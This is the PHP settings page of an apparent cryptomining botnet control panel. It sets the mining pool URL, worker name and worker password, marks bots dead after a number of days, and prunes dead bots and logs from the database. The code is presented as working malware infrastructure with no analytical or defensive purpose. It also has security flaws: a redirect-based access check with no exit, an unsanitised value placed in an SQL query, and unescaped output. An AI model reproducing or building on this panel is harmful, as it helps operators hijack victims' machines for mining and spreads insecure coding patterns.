<?php
include('header.php');
if($settings->super != $_SESSION['username']) header('Location: index.php');
if(isset($_GET['prune'])) {
    if ($_GET['prune'] == 1)
        $con->query("DELETE FROM bots WHERE UNIX_TIMESTAMP()-time >= (86400*$settings->deadline)");
    else
        $con->query("DELETE FROM logs");
}
?>

    <div id="content">
        <form method="POST" id="settings-form">
            <div id="content-content">
                <div id="content-header">
                    <div id="content-title">
                        Change Password
                    </div>
                </div>

                <div id="settings-box">
                    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                Old Password
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="password" name="oldpassword" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" />
                        </div>
                    </div>

                    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                New Password
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="password" name="newpassword" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" />
                        </div>
                    </div>

                    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                Re Password
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="password" name="repassword" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" />
                        </div>
                    </div>
                </div>
            </div>

            <div id="content-content">
                <div id="content-header">
                    <div id="content-title">
                        Miner Settings
                    </div>
                </div>

                <div id="settings-box">
                    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                Mining Pool
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="text" name="miner-parameter" placeholder="stratum+tcp://pool.d2.cc:3333" value="<?php echo $settings->pool;?>" />
                        </div>
                    </div>

                    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                Username
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="text" name="worker-name" placeholder="Worker Name" value="<?php echo $settings->worker;?>" />
                        </div>
                    </div>

                    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                Password
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="password" name="work-password" placeholder="Worker Password" value="<?php echo $settings->wpassword;?>" />
                        </div>
                    </div>
                </div>
            </div>

            <div id="content-content">
                <div id="content-header">
                    <div id="content-title">
                        Panel Settings
                    </div>
                </div>

                <div id="settings-box">
		    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                Logs Per Page
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="number" name="logsperpage" value="<?php echo $settings->logspg;?>" min="5" max="30" placeholder="" />
                        </div>
                    </div>

                    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                Bots Per Page
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="number" name="botsperpage" value="<?php echo $settings->botspg;?>" min="5" max="20" placeholder="" />
                        </div>
                    </div>

                    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                Bot Dead After
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="number" name="markdead" min="1" max="20" value="<?php echo $settings->deadline;?>" placeholder="<?php echo $settings->deadline;?> Days" />
                        </div>
                    </div>

                    <div id="content-strip">
                        <div id="content-left">
                            <div id="left-text">
                                Pruning
                            </div>
                        </div>

                        <div id="content-right">
                            <input type="submit" name="prune-dead" value="Prune Dead Bots"/>
			    <input type="submit" name="prune-logs" value="Prune Logs"/>
                        </div>
                    </div>
                </div>
            </div>

            <div id="content-out">
                <input type="submit" value="Save" name="save"/>
            </div>

            <div id="content-footer">

            </div>
        </form>
    </div>
<script>
    regForm();
</script>
<?php
include('footer.php');
?>